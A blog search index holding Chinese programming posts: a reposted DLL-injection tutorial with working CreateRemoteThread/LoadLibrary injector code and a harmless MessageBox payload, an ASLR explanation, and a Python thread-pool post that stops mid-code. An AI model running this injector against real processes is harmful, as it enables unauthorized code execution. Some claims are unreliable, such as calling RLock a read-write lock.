<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？</title>
      <link href="/2024/02/04/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9C%A8ASLR%E6%9C%BA%E5%88%B6%E4%B8%8BDLL%E6%96%87%E4%BB%B6%E5%9C%A8%E4%B8%8D%E5%90%8C%E8%BF%9B%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%9F%BA%E5%9D%80%E7%9B%B8%E5%90%8C%EF%BC%9F/"/>
      <url>/2024/02/04/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9C%A8ASLR%E6%9C%BA%E5%88%B6%E4%B8%8BDLL%E6%96%87%E4%BB%B6%E5%9C%A8%E4%B8%8D%E5%90%8C%E8%BF%9B%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%9F%BA%E5%9D%80%E7%9B%B8%E5%90%8C%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？"><a href="#为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？" class="headerlink" title="为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？"></a><a href="https://www.cnblogs.com/zyorca/p/17841452.html">为什么在ASLR机制下DLL文件在不同进程中的加载基址相同？</a></h2><p><strong>本篇文章为转载内容，单击标题进入原作者地址。若转载行为有侵权，请联系删除。</strong></p><h1 id="1-DLL-注入实现"><a href="#1-DLL-注入实现" class="headerlink" title="1. DLL 注入实现"></a>1. DLL 注入实现</h1><p>以下是实现 DLL注入的简要步骤：</p><p>1.1 打开 Visual Studio，并创建一个新的 DLL 项目。</p><p>1.2 在”dllmain.cpp” 添加以下的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"> <span class="number">3</span> </span><br><span class="line"> <span class="number">4</span> <span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="number">5</span>                        DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="number">6</span>                        LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="number">7</span>                      )</span></span></span><br><span class="line"><span class="function"> 8 </span>&#123;</span><br><span class="line"> <span class="number">9</span>     <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line"><span class="number">10</span>     &#123;</span><br><span class="line"><span class="number">11</span>     <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"><span class="number">12</span>         <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;您的进程已被注入&quot;</span>, <span class="string">&quot;注入警告&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">13</span>         <span class="keyword">break</span>;</span><br><span class="line"><span class="number">14</span>     <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="number">15</span>         <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;您的进程已被注入&quot;</span>, <span class="string">&quot;注入警告&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">16</span>         <span class="keyword">break</span>;</span><br><span class="line"><span class="number">17</span>     <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="number">18</span>         <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;您的进程已被注入&quot;</span>, <span class="string">&quot;注入警告&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">19</span>         <span class="keyword">break</span>;</span><br><span class="line"><span class="number">20</span>     <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="number">21</span>         <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;您的进程已被注入&quot;</span>, <span class="string">&quot;注入警告&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">22</span>         <span class="keyword">break</span>;</span><br><span class="line"><span class="number">23</span>     &#125;</span><br><span class="line"><span class="number">24</span>     <span class="keyword">return</span> TRUE;</span><br><span class="line"><span class="number">25</span> &#125;</span><br></pre></td></tr></table></figure><p>1.3 生成 DLL 文件，得到一个名为 “InjectDll.dll” 的 DLL文件。</p><p>1.4 运行以下代码，将 DLL文件注入到记事本进程中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> </span><br><span class="line"> <span class="number">4</span> <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> 5 </span>&#123;</span><br><span class="line"> <span class="number">6</span>     <span class="comment">// 获取目标进程的句柄</span></span><br><span class="line"> <span class="number">7</span>     HWND hWnd = <span class="built_in">FindWindow</span>(<span class="literal">NULL</span>, <span class="string">L&quot;无标题 - Notepad&quot;</span>);</span><br><span class="line"> <span class="number">8</span>     <span class="keyword">if</span> (hWnd == <span class="literal">NULL</span>) &#123;</span><br><span class="line"> <span class="number">9</span>         <span class="built_in">printf</span>(<span class="string">&quot;未找到目标进程\n&quot;</span>);</span><br><span class="line"><span class="number">10</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">11</span>     &#125;</span><br><span class="line"><span class="number">12</span> </span><br><span class="line"><span class="number">13</span>     DWORD processId;</span><br><span class="line"><span class="number">14</span>     <span class="built_in">GetWindowThreadProcessId</span>(hWnd, &amp;processId);</span><br><span class="line"><span class="number">15</span>     HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, processId);</span><br><span class="line"><span class="number">16</span>     <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">17</span>         <span class="built_in">printf</span>(<span class="string">&quot;无法打开目标进程\n&quot;</span>);</span><br><span class="line"><span class="number">18</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">19</span>     &#125;</span><br><span class="line"><span class="number">20</span> </span><br><span class="line"><span class="number">21</span>     <span class="comment">// 在目标进程中分配内存</span></span><br><span class="line"><span class="number">22</span>     LPVOID pRemoteBuffer = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="number">23</span>     <span class="keyword">if</span> (pRemoteBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">24</span>         <span class="built_in">printf</span>(<span class="string">&quot;无法在目标进程中分配内存\n&quot;</span>);</span><br><span class="line"><span class="number">25</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">26</span>     &#125;</span><br><span class="line"><span class="number">27</span> </span><br><span class="line"><span class="number">28</span>     <span class="comment">// 将DLL路径写入目标进程</span></span><br><span class="line"><span class="number">29</span>     <span class="type">char</span> dllPath[] = <span class="string">&quot;E:\\Test\\InjectDll.dll&quot;</span>;</span><br><span class="line"><span class="number">30</span>     <span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteBuffer, dllPath, <span class="built_in">sizeof</span>(dllPath), <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="number">31</span>         <span class="built_in">printf</span>(<span class="string">&quot;无法写入目标进程内存\n&quot;</span>);</span><br><span class="line"><span class="number">32</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">33</span>     &#125;</span><br><span class="line"><span class="number">34</span> </span><br><span class="line"><span class="number">35</span>     <span class="comment">// 获取LoadLibrary函数的地址</span></span><br><span class="line"><span class="number">36</span>     HMODULE hKernel32 = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="number">37</span>     <span class="keyword">if</span> (hKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">38</span>         <span class="built_in">printf</span>(<span class="string">&quot;未找到kernel32.dll\n&quot;</span>);</span><br><span class="line"><span class="number">39</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">40</span>     &#125;</span><br><span class="line"><span class="number">41</span> </span><br><span class="line"><span class="number">42</span>     FARPROC pLoadLibrary = <span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="number">43</span>     <span class="keyword">if</span> (pLoadLibrary == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">44</span>         <span class="built_in">printf</span>(<span class="string">&quot;未找到LoadLibrary函数\n&quot;</span>);</span><br><span class="line"><span class="number">45</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">46</span>     &#125;</span><br><span class="line"><span class="number">47</span> </span><br><span class="line"><span class="number">48</span>     <span class="comment">// 在目标进程中调用LoadLibrary函数加载DLL</span></span><br><span class="line"><span class="number">49</span>     HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteBuffer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">50</span>     <span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">51</span>         <span class="built_in">printf</span>(<span class="string">&quot;无法在目标进程中创建远程线程\n&quot;</span>);</span><br><span class="line"><span class="number">52</span>         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">53</span>     &#125;</span><br><span class="line"><span class="number">54</span> </span><br><span class="line"><span class="number">55</span>     <span class="built_in">printf</span>(<span class="string">&quot;DLL注入成功\n&quot;</span>);</span><br><span class="line"><span class="number">56</span> </span><br><span class="line"><span class="number">57</span>     <span class="comment">// 等待远程线程退出</span></span><br><span class="line"><span class="number">58</span>     <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="number">59</span> </span><br><span class="line"><span class="number">60</span>     <span class="comment">// 清理资源</span></span><br><span class="line"><span class="number">61</span>     <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="number">62</span>     <span class="built_in">VirtualFreeEx</span>(hProcess, pRemoteBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="number">63</span>     <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="number">64</span> </span><br><span class="line"><span class="number">65</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">66</span> &#125;</span><br></pre></td></tr></table></figure><p>总结一下 Dll 注入步骤</p><ul><li>定位目标进程：使用Windows API函数（如FindWindow）或其他技术来获取目标进程的句柄或进程ID；</li><li>打开目标进程：使用OpenProcess函数打开目标进程，获取进程的句柄，以便后续操作；</li><li>在目标进程中分配内存：使用VirtualAllocEx函数在目标进程中分配一块内存，用于存储DLL路径或其他数据；</li><li>将DLL路径写入目标进程：使用WriteProcessMemory函数将DLL路径或其他数据写入目标进程的内存空间；</li><li>获取函数地址：获取所需函数（例如LoadLibrary）在目标进程所加载的模块中的地址，通常使用GetModuleHandle和GetProcAddress函数；</li><li>在目标进程中创建远程线程：使用CreateRemoteThread函数在目标进程中创建一个远程线程，该线程执行加载DLL的函数，并将DLL路径作为参数传递；</li><li>等待远程线程退出：使用WaitForSingleObject函数等待远程线程退出，确保注入操作完成；</li><li>清理资源：关闭句柄、释放内存等，以确保不会产生资源泄漏。</li></ul><h1 id="2-为什么在ASLR机制下DLL文件在不同进程中加载的基址相同"><a href="#2-为什么在ASLR机制下DLL文件在不同进程中加载的基址相同" class="headerlink" title="2. 为什么在ASLR机制下DLL文件在不同进程中加载的基址相同"></a>2. 为什么在ASLR机制下DLL文件在不同进程中加载的基址相同</h1><h2 id="2-1-ALSR"><a href="#2-1-ALSR" class="headerlink" title="2.1. ALSR"></a>2.1. ALSR</h2><p>ASLR（Address Space Layout Randomization）是一种用于增加系统安全性的技术，它通过随机化内存地址的分配，使攻击者更难以利用已知的内存布局漏洞进行攻击。实际上ASLR的概念在Windows XP时代就已经提出来了，只不过XP上面的ASLR功能很有限，只是对PEB和TEB进行了简单的随机化处理，而对于模块的加载基址没有进行随机化处理，直到Windows Vista出现后，ASLR才真正开始发挥作用。</p><p>微软从Visual Studio 2005 SP1开始加入了&#x2F;dynamicbase链接选项使编译好的程序支持随机基址，只需要在编译程序的时候启用&#x2F;dynmicbase链接选项。（Visual Studio 2022 可以在项目属性中设置：配置属性——链接器——高级——随机基址）</p><p><img src="/.io//1700313198128-26c68044-e1a0-4fb0-9ae3-be09d967e8e0.png" alt="img"></p><p>PE文件中IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE值为1，则说明该 PE文件支持ASLR，如下图所示。</p><p><img src="/.io//1700314676096-75eb5123-70ad-4969-ae1e-7622cd467747.png" alt="img"></p><p>ALSR 会随机化的地址包括：</p><ul><li>堆地址</li><li>栈地址</li><li>PE文件加载基址</li><li>PEB和TEB地址</li></ul><p>ALSR 机制能保证在每次系统重启后，系统DLL文件在进程中的加载基址不会是默认的地址0x10000000（EXE文件的默认加载基址是0x00400000），而是一个随机的地址。系统重启后这个加载基址会再次变化，ASLR的出现使得shellcode中的关键跳转只能在系统重启前，甚至只有程序的本次运行时才能执行，这使得exploit的难度大大增加。在ALSR开启的状态下，DLL 注入依然能实现是因为DLL文件在不同进程中加载的基址虽然经过了随机化的处理，但系统DLL文件(如system32目录下的DLL)在各个进程中通常加载地址仍然是相同的，以保证不同进程能互相调用这些系统DLL提供的 API。</p><h2 id="2-2-Copy-On-Write"><a href="#2-2-Copy-On-Write" class="headerlink" title="2.2. Copy-On-Write"></a>2.2. Copy-On-Write</h2><p>其中更深层次的原因是操作系统需要支持写时复制机制（copy-on-write）。写时复制是现代操作系统的一个重要特性。操作系统使用页表（Page Table）来将进程的虚拟地址映射到物理地址。页表是一种数据结构，它存储了虚拟地址和物理地址之间的映射关系。</p><p>A 进程和 B 进程共享同一个 DLL 时，它们的虚拟地址空间中的虚拟地址会指向相同的物理内存页。这意味着它们共享同一份物理内存。当 A 进程尝试对 DLL 内存页进行写操作时，操作系统会触发写时复制，操作系统会将共享的物理内存页复制一份，创建一个新的物理页供 A 进程使用。A 进程会拥有自己的独立副本，而进程B仍然使用原始的物理内存页。</p><p>Copy-On-Write机制触发并不会影响虚拟地址空间的映射关系。因此，在Copy-On-Write机制中，虚拟地址空间中DLL的加载基址不会发生变化。进程A仍然可以通过原始的加载基址访问和调用DLL中的代码和数据。当多个进程加载同一个 DLL 文件并且它们的加载基址保持相同时，可以更好地利用 Copy-On-Write 机制。这样可以实现代码和只读数据的共享，延迟数据的复制，并提高内存利用率和性能。如果 DLL 加载地址不一致，Copy-On-Write 无法共享内存页，每个进程都需要单独复制 DLL 的只读内存，失去了内存优化的效果。</p><h2 id="2-3-PE文件的加载机制"><a href="#2-3-PE文件的加载机制" class="headerlink" title="2.3. PE文件的加载机制"></a>2.3. PE文件的加载机制</h2><p>在 PE 文件中有一个加载基址（Image Base）的字段，它指定了 DLL 文件在内存中的起始地址。操作系统在加载DLL文件时，首先会检查文件头中的标志，确定是否启用了ASLR或者是否存在重定位表。如果存在重定位表，操作系统会遍历重定位表中的每个条目。重定位表中的每个条目包含了两个关键信息：</p><ul><li>重定位类型（Relocation Type）： 指定了需要进行的重定位操作，例如相对地址的基址绝对化。</li><li>偏移量（Offset）： 指定了在文件中的位置，即需要进行重定位的虚拟地址相对于模块基址的偏移量。</li></ul><p>操作系统使用以下公式计算PE 文件中需要进行重定位的虚拟地址：VirtualAddress &#x3D; ImageBase + Offset（偏移量）</p><p>在相同的操作系统和相同的加载条件下，相同的DLL文件在不同进程中的重定位计算是一致的。因此，无论 ASLR 是否启用，PE 文件的加载机制决定了 DLL 文件在各个进程中的加载基址是相同的。</p><p>综合这三个角度，虽然ASLR在操作系统的进程管理中引入了加载基址的随机化，但由于Copy-On-Write和PE文件加载机制的作用，同一DLL文件在不同进程中的加载基址仍然是相同的。这有助于确保不同进程中的DLL文件内部结构保持一致，同时确保进程间的数据隔离，提高系统的整体安全性和资源使用效率。</p>]]></content>
      
      
      <categories>
          
          <category> Windows Programming </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>线程池</title>
      <link href="/2024/02/04/%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
      <url>/2024/02/04/%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h1><p>处理大量的数据</p><p>线程池是可用于执行任务的线程的集合。这是一种管理和重用线程的方法，可以减少创建和销毁线程的开销。</p><p>在线程池中，会创建和维护固定数量的线程。当任务提交到线程池时，将分配一个可用线程来执行该任务。一旦任务完成，线程就会返回到池中，并可用于执行另一个任务。</p><p>线程池通常用于需要同时执行多个任务的应用程序。它们可以通过减少创建和销毁线程的开销，以及允许并行执行任务来提高性能。ThreadPoolExecutor类用于创建和管理线程池，submit方法用于将任务提交到池中执行。以下是如何使用ThreadPoolExecutor类创建线程池的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a thread pool with 4 threads</span></span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">4</span>) <span class="keyword">as</span> executor:</span><br><span class="line">    <span class="comment"># Submit a task to the pool</span></span><br><span class="line">    future = executor.submit(my_function, arg1, arg2)</span><br><span class="line">    <span class="comment"># Wait for the task to complete and get the result</span></span><br><span class="line">    result = future.result()</span><br></pre></td></tr></table></figure><p>在本例中，使用ThreadPoolExecutor类创建了一个包含4个线程的线程池。使用submit方法将任务提交到池中，使用result方法等待任务完成并获得结果。</p><p>读写锁是一种同步机制，用于控制对共享资源的访问。读写锁允许多个线程同时读取共享资源，但只允许一个线程写入共享资源。这可以提高并发性能，因为多个线程可以同时读取共享资源，而不会相互干扰。在Python中，可以使用threading模块中的RLock类来实现读写锁。</p><p>条件变量是一种同步机制，用于在多个线程之间传递信号。条件变量允许一个或多个线程等待某个条件变为真，然后再继续执行。在Python中，可以使用threading模块中的Condition类来实现条件变量。Condition类包含wait，notify和notifyall等方法，用于等待条件变为真，通知等待线程条件已经满足，以及通知所有等待线程条件已经满足。条件变量通常与锁一起使用，以确保线程安全。在ThreadPoolExecutor类中，可以使用条件变量来控制线程池中任务的执行顺序，例如等待某个任务完成后再执行另一个任务。</p><p>状态变量是用于跟踪线程池中任务的状态的变量。在ThreadPoolExecutor类中，有几个状态变量用于跟踪线程池中任务的状态，例如active<em>count，completed</em>count和shutdown等。active<em>count变量用于跟踪当前正在执行的任务数，completed</em>count变量用于跟踪已完成的任务数，shutdown变量用于指示线程池是否已关闭。这些状态变量可以帮助你了解线程池中任务的状态，并根据需要采取适当的措施。</p><p>读写锁和条件变量是两种不同的同步机制，用于不同的目的。读写锁用于控制对共享资源的访问，以提高并发性能。条件变量用于在多个线程之间传递信号，以控制线程的执行顺序。</p><p>读写锁允许多个线程同时读取共享资源，但只允许一个线程写入共享资源。这可以提高并发性能，因为多个线程可以同时读取共享资源，而不会相互干扰。在Python中，可以使用threading模块中的RLock类来实现读写锁。</p><p>条件变量允许一个或多个线程等待某个条件变为真，然后再继续执行。在Python中，可以使用threading模块中的Condition类来实现条件变量。条件变量通常与锁一起使用，以确保线程安全。在ThreadPoolExecutor类中，可以使用条件变量来控制线程池中任务的执行顺序，例如等待某个任务完成后再执行另一个任务。</p><h2 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h2><p>互斥体（Mutex）是一种同步机制，用于保护共享资源免受并发访问的影响。在线程池中，互斥体可以用来保护共享资源，例如共享变量或共享数据结构，以确保在任何给定时间只有一个线程可以访问它们。这可以防止多个线程同时修改共享资源，从而避免数据竞争和其他并发问题。因此，在线程池中使用互斥体是非常重要的。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 共享变量</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个互斥体</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="string">&quot;&quot;&quot;模拟一个耗时的任务&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Worker <span class="subst">&#123;num&#125;</span> starting&quot;</span>)</span><br><span class="line">    <span class="comment"># 获取互斥体</span></span><br><span class="line">    <span class="keyword">with</span> lock:</span><br><span class="line">        <span class="comment"># 修改共享变量</span></span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Worker <span class="subst">&#123;num&#125;</span> finished&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 创建一个包含4个线程的线程池</span></span><br><span class="line">    <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">4</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        <span class="comment"># 向线程池中添加10个任务</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            executor.submit(worker, i)</span><br><span class="line">    <span class="comment"># 打印共享变量的值</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Counter value: <span class="subst">&#123;counter&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>为了避免多个线程同时修改counter，我们使用了一个互斥体lock来保护它。在worker函数中，我们首先获取互斥体，然后修改共享变量counter。这样，我们就可以确保在任何给定时间只有一个线程可以访问counter，从而避免数据竞争和其他并发问题。</p><p>在计算机科学中，互斥体（Mutex）和锁（Lock）是两个常用的概念，它们都是用于保护共享资源免受并发访问的影响。在实际应用中，这两个概念有时会被混淆使用，但它们并不完全相同。</p><p>互斥体是一种同步机制，用于保护共享资源免受并发访问的影响。在多线程编程中，互斥体可以用来保护共享资源，例如共享变量或共享数据结构，以确保在任何给定时间只有一个线程可以访问它们。这可以防止多个线程同时修改共享资源，从而避免数据竞争和其他并发问题。在Python中，可以使用threading模块中的Lock类来实现互斥体的功能。</p><p>锁是一种更加通用的同步机制，它可以用于实现互斥体、信号量、条件变量等多种同步原语。在Python中，可以使用threading模块中的Lock类来实现锁的功能。Lock类提供了acquire和release方法，用于获取和释放锁。当一个线程获取了锁之后，其他线程就无法获取锁，直到该线程释放锁为止。因此，锁可以用来保护临界区，以确保在任何给定时间只有一个线程可以访问它们。</p><p>在实际应用中，互斥体和锁有时会被混淆使用，因为它们的功能有一定的重叠。在某些情况下，互斥体和锁可以互换使用，但在其他情况下，它们可能会有所不同。例如，在某些操作系统中，互斥体和锁的实现方式可能不同，因此它们的性能和行为也可能会有所不同。</p><p>在Python中，Lock类通常被用作互斥体的实现方式。因此，在线程池中使用Lock类来保护共享资源是非常常见的做法。</p><h2 id="假唤醒"><a href="#假唤醒" class="headerlink" title="假唤醒"></a>假唤醒</h2><p>虚假唤醒（Spurious Wakeup）是指在多线程编程中，一个线程在等待某个条件变量时，即使没有其他线程通知它，它也会被唤醒。这种情况可能会导致程序出现错误或异常行为，因为线程可能会在没有满足条件的情况下被唤醒。一般是由于在设置超时的时候发生。</p><p>在Python中，可以使用threading模块中的Condition类来实现条件变量。Condition类提供了wait、notify和notify_all等方法，用于等待条件变量、通知等待线程和通知所有等待线程。在使用Condition类时，需要注意虚假唤醒的问题。为了避免虚假唤醒，可以在wait方法中使用循环来检查条件是否满足，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 共享变量</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个条件变量</span></span><br><span class="line">cond = threading.Condition()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>():</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="string">&quot;&quot;&quot;模拟一个耗时的任务&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Worker starting&quot;</span>)</span><br><span class="line">    <span class="comment"># 获取条件变量</span></span><br><span class="line">    <span class="keyword">with</span> cond:</span><br><span class="line">        <span class="comment"># 检查条件是否满足</span></span><br><span class="line">        <span class="keyword">while</span> counter &lt; <span class="number">10</span>:</span><br><span class="line">            <span class="comment"># 等待条件变量</span></span><br><span class="line">            cond.wait()</span><br><span class="line">        <span class="comment"># 修改共享变量</span></span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Worker finished&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 创建一个线程</span></span><br><span class="line">    t = threading.Thread(target=worker)</span><br><span class="line">    t.start()</span><br><span class="line">    <span class="comment"># 修改共享变量</span></span><br><span class="line">    